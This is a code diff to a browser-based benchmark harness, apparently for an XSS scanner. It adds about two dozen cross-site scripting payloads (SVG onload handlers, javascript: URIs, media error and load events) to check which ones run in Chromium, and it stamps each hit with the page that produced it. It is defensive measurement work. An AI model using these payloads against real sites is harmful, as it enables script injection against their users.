@@ -205,6 +205,78 @@ PAYLOADS: list[tuple[str, str, tuple[str, ...]]] = [
 #: means "not yet" -- the same failure the `commit` navigation once produced for
 #: `<iframe srcdoc>` (see `_wait_load`), so it is bounded the same way: give the
 #: mechanism the time it actually needs.
+# ---------------------------------------------------------------------------
+# Phase 176j: the families corpus_gap.py says nobody has ever judged.
+#
+# `python -m benchmark.corpus_gap` reported 1782 of 2532 shipped corpus strings
+# carrying at least one token that NO measured corpus has ever judged -- and the
+# reason was visible in PAYLOADS above: not one of the flagged families
+# (xlink:href, background, <image>, foreignObject, the HTML5 media handlers, the
+# SVG element set) appeared in it.  The oracle was 60 hand-picked shapes, so
+# whole families sat in the shipped corpus with the sandbox asserting answers
+# nobody had measured.
+#
+# These are taken verbatim from xssentinel/data/payloads.json -- the strings the
+# scanner actually sends -- with only `alert(1)` swapped for the sentinel, so a
+# row here answers the question for a payload that SHIPS, not for one invented
+# to make the test comfortable.
+# ---------------------------------------------------------------------------
+_CORPUS_GAP_FAMILIES: list[tuple[str, str]] = [
+    ("cg-xlink-href",
+     "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>"),
+    ("cg-background",
+     "background:url(javascript:alert(1))"),
+    ("cg-svg-image",
+     "<svg><image href=javascript:alert(1)>"),
+    ("cg-onclick-jsx",
+     "<button onClick={() => { eval('alert(1)') }}>x</button>"),
+    ("cg-foreignobject",
+     "<svg><foreignObject><body xmlns=http://www.w3.org/1999/xhtml "
+     "onload=alert(1)></body></foreignObject></svg>"),
+    ("cg-isindex",
+     "<isindex action=javascript:alert(1) type=submit value=x>"),
+    ("cg-audio-onerror",
+     "<audio src=x onerror=alert(1)>"),
+    ("cg-svg-desc-img",
+     "<svg><desc><img src=x onerror=alert(1)></desc></svg>"),
+    ("cg-dialog-onload",
+     "<dialog open onload=alert(1)>"),
+    ("cg-feimage",
+     "<svg><feImage href=javascript:alert(1)>"),
+    ("cg-canvas-onload",
+     "<canvas onload=alert(1)>"),
+    ("cg-clippath",
+     "<svg><clipPath onload=alert(1)>"),
+    ("cg-defs",
+     "<svg><defs onload=alert(1)>"),
+    ("cg-ellipse",
+     "<svg><ellipse onload=alert(1)>"),
+    ("cg-filter",
+     "<svg><filter onload=alert(1)>"),
+    ("cg-keygen",
+     "<keygen onfocus=alert(1) autofocus>"),
+    ("cg-lineargradient",
+     "<svg><linearGradient onload=alert(1)>"),
+    ("cg-listener",
+     "<svg><listener event='load' observer='x' handler='#h'/>"
+     "<handler id='h' type='text/javascript'>alert(1)</handler></svg>"),
+    ("cg-marker",
+     "<svg><marker onload=alert(1)>"),
+    ("cg-mask",
+     "<svg><mask onload=alert(1)>"),
+    ("cg-video-oncanplay",
+     "<video oncanplay=alert(1)>"),
+    ("cg-video-onloadeddata",
+     "<video onloadeddata=alert(1)>"),
+    ("cg-video-onloadstart",
+     "<video onloadstart=alert(1)>"),
+    ("cg-summary-ontoggle",
+     "<details open><summary>x</summary><p>y</p></details ontoggle=alert(1)>"),
+]
+
+PAYLOADS += [(pid, body.replace("alert(1)", X), ("corpus_gap",))
+             for pid, body in _CORPUS_GAP_FAMILIES]
+
 SETTLE_OVERRIDES = {
     "smil-animate-end": 1800,
 }
@@ -228,6 +300,59 @@ SETTLE_OVERRIDES = {
 HOST_SETTLE_OVERRIDES = {
     "iframe_src": 1500,
 }
+
+# ---------------------------------------------------------------------------
+# Stamped hits: which document actually executed?
+#
+# `_INIT` above records a bare '1', and `localStorage` is shared by every
+# same-origin document -- including a frame that a PREVIOUS row left navigating.
+# A hit could therefore be written by the wrong page, which is how one full
+# 1200-row run of this matrix can disagree with another on rows as ordinary as
+# `img-onerror x text` (7 rows did, found by benchmark/oracle_reproduce.py;
+# `benchmark/results/browser_dom_oracle.json` in this tree said exec_ihn1=False
+# where a stamped re-measure says True three times out of three).
+#
+# So the sentinel now stamps the URL it ran under, and each row is served on its
+# OWN path: a hit counts only if the stamp names this row's page.  A late write
+# from another row reads as a MISS rather than a false True -- the safe direction,
+# because a lost row can be re-measured while an invented execution becomes a
+# permanent wrong rule in sandbox.py.  The raw stamps are kept in the artifact so
+# contamination is not just prevented but *countable*: `main()` reports how many
+# rows saw a foreign stamp, and any row can be audited after the fact.
+#
+# The window matters: a `javascript:` frame runs in its own realm whose `location`
+# is `about:blank`/`about:srcdoc`, so the stamp is taken from `window.top`
+# (same-origin here) and only falls back to the local location if that read is
+# refused.
+# ---------------------------------------------------------------------------
+_INIT_STAMP = """
+window.__x = function () {
+  var stamp = '?';
+  try { stamp = window.top.location.pathname; }
+  catch (e) { try { stamp = location.pathname; } catch (e2) {} }
+  try { localStorage.setItem('__exec', stamp); } catch (e3) {}
+};
+"""
+
+
+def _read_stamp(page):
+    """The URL of whichever document last raised the sentinel, or None."""
+    try:
+        return page.evaluate("() => { try { return localStorage.getItem('__exec')"
+                             " } catch (e) { return null } }")
+    except Exception:
+        return None
+
+
+def _hit(page, expect: str) -> tuple[bool, str | None]:
+    """(did THIS page execute, the stamp actually seen).
+
+    The second value is what makes the artifact auditable: `('p7', '/p3')` says a
+    late write from row 3 landed in row 7's read, which is a harness finding
+    rather than a browser fact.
+    """
+    got = _read_stamp(page)
+    return got == expect, got
 
 # ---------------------------------------------------------------------------
 # Hosts: where the payload lands in the document the server returned.
@@ -425,47 +550,54 @@ def run(settle_ms: int = 300, limit: int = 0) -> list[dict]:
     from playwright.sync_api import sync_playwright
 
     srv, base = _serve()
-    _Handler.PAGES = {"/blank": "<html><body></body></html>"}
+    blank = "<html><body></body></html>"
+    _Handler.PAGES = {"/blank": blank}
     rows: list[dict] = []
+    seq = 0
     try:
         with sync_playwright() as p:
             browser = p.chromium.launch()
             ctx = browser.new_context()
-            ctx.add_init_script(_INIT)
+            ctx.add_init_script(_INIT_STAMP)
             page = ctx.new_page()
             page.goto(base + "/blank", wait_until="load")
             for pid, payload, tags in PAYLOADS:
                 for hid, host, _ok in HOSTS:
                     if limit and len(rows) >= limit:
                         break
+                    seq += 1
+                    # one path per arm per row: the stamp of a hit is only
+                    # meaningful if the URL it names belongs to this question
+                    pkey, bkey = f"/p{seq}", f"/b{seq}"
                     doc = host.replace("__P__", payload)
+                    _Handler.PAGES[pkey] = doc
+                    _Handler.PAGES[bkey] = blank
                     row: dict = {"payload": pid, "host": hid,
-                                 "tags": list(tags), "document": doc}
+                                 "tags": list(tags), "document": doc,
+                                 "stamp_paths": {"parser": pkey, "sink": bkey}}
 
                     settle = max(settle_ms, SETTLE_OVERRIDES.get(pid, 0),
                                  HOST_SETTLE_OVERRIDES.get(hid, 0))
 
                     # ---- sink 1: the parser, i.e. what the server reflected --
-                    _Handler.PAGES["/p"] = doc
                     if not _goto(page, base + "/blank"):
-                        row.update({"payload": pid, "host": hid,
-                                    "exec_parser": None, "exec_ihn1": None,
+                        row.update({"exec_parser": None, "exec_ihn1": None,
                                     "exec_ihn2": None, "mxss": False,
                                     "harness_error": "loopback reset"})
                         rows.append(row)
                         continue
                     _clear(page)
                     try:
-                        page.goto(base + "/p", wait_until="commit")
+                        page.goto(base + pkey, wait_until="commit")
                         _wait_load(page)
                         page.wait_for_timeout(settle)
-                        row["exec_parser"] = _read_hit(page)
+                        row["exec_parser"], row["parser_stamp"] = _hit(page, pkey)
                     except Exception as e:
                         row["exec_parser"] = None
                         row["parser_err"] = str(e)[:120]
 
                     # ---- sink 2: a DOM sink re-parses the same bytes ---------
-                    if not _goto(page, base + "/blank"):
+                    if not _goto(page, base + bkey):
                         row["exec_ihn1"] = row["exec_ihn2"] = None
                         row["mxss"] = False
                         row["harness_error"] = "loopback reset before sink2"
@@ -477,7 +609,7 @@ def run(settle_ms: int = 300, limit: int = 0) -> list[dict]:
                     try:
                         a = page.evaluate(_PROBE, {"html": doc,
                                                    "settle": settle})
-                        row["exec_ihn1"] = _read_hit(page)
+                        row["exec_ihn1"], row["ihn1_stamp"] = _hit(page, bkey)
                         row["serialized"] = a["ser"]
                         row["live_after_parse"] = a["live"]
                         if a["err"]:
@@ -486,7 +618,7 @@ def run(settle_ms: int = 300, limit: int = 0) -> list[dict]:
                         row["serialized2"] = page.evaluate(
                             _REPROBE, {"html": a["ser"] or "",
                                                "settle": max(150, settle)})
-                        row["exec_ihn2"] = _read_hit(page)
+                        row["exec_ihn2"], row["ihn2_stamp"] = _hit(page, bkey)
                         row["mutated"] = (a["ser"] or "") != (
                             row["serialized2"] or "")
                     except Exception as e:
@@ -528,6 +660,21 @@ def main() -> int:
     print(f"mutation XSS (ihn2 not ihn1): {sum(1 for r in rows if r.get('mxss'))}")
     print(f"serialization changed on 2nd round-trip: "
           f"{sum(1 for r in rows if r.get('mutated'))}")
+
+    # Contamination, counted rather than assumed away.  An arm whose stamp names
+    # some OTHER row's page is a measurement the harness cannot honour: the late
+    # write arrived, but not from the document being asked about.  Those rows are
+    # reported as False above (the safe direction), and listed here so the size of
+    # the problem is visible instead of being silently folded into "inert".
+    stray = [(r.get("payload"), r.get("host"), arm)
+             for r in rows
+             for arm, key in (("parser", "parser_stamp"), ("ihn1", "ihn1_stamp"),
+                              ("ihn2", "ihn2_stamp"))
+             if r.get(key) not in (None, (r.get("stamp_paths") or {}).get(
+                 "parser" if arm == "parser" else "sink"))]
+    print(f"late writes from another row  : {len(stray)}")
+    for p, h, arm in stray[:10]:
+        print(f"    STRAY  {p} x {h} ({arm})")
     print("\nmutation-XSS cases (the pure-Python sandbox must model these):")
     for r in rows:
         if r.get("mxss"):
